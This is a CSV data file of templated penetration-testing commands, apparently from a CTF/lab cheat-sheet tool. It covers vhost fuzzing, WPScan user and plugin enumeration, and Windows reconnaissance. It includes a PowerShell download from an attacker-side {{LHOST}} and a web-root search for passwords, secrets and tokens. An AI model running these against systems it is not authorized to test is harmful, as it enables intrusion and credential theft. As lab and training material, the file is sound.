id,section,category,title,command,description,placeholders,pack
web-virtual-hosts-vhost-fuzzing,Web,Virtual Hosts,Vhost fuzzing,ffuf -u http://{{IP}}/ -H 'Host: FUZZ.{{DOMAIN}}' -w wordlists/subdomains.txt -fs 0,Find virtual hosts in a CTF/lab.,"DOMAIN,IP",web
web-wordpress-wpscan-enumerate-users,Web,WordPress,WPScan enumerate users,wpscan --url http://{{DOMAIN}} --enumerate u,Enumerate WordPress users in an authorized lab.,DOMAIN,web
web-wordpress-wpscan-plugins,Web,WordPress,WPScan plugins,wpscan --url http://{{DOMAIN}} --enumerate p,Enumerate plugins in an authorized lab.,DOMAIN,web
windows-basics-current-user,Windows,Basics,Current user,whoami /all,"Show user, groups, and privileges.",,windows
windows-basics-system-info,Windows,Basics,System info,systeminfo,Show host and OS details.,,windows
windows-network-listening-ports,Windows,Network,Listening ports,netstat -ano,Show listening ports and PIDs.,,windows
windows-network-network-config,Windows,Network,Network config,ipconfig /all && route print,Show network configuration and routes.,,windows
windows-powershell-download-file,Windows,PowerShell,Download file,"powershell -c ""Invoke-WebRequest -Uri http://{{LHOST}}:{{PORT}}/file -OutFile file""",Download from your own lab host.,"LHOST,PORT",windows
windows-powershell-find-files-by-name,Windows,PowerShell,Find files by name,"powershell -c ""Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue -Filter *config*""",Find config files.,,windows
windows-powershell-search-text-files,Windows,PowerShell,Search text files,"powershell -c ""Select-String -Path C:\inetpub\wwwroot\* -Pattern 'password','secret','token' -Recurse""",Search web root for lab credential keywords.,,windows
windows-services-services-list,Windows,Services,Services list,"wmic service get name,displayname,pathname,startmode",Review services and paths.,,windows
windows-users-local-admins,Windows,Users,Local admins,net localgroup administrators,List local administrators.,,windows
windows-users-local-users,Windows,Users,Local users,net user,List local users.,,windows
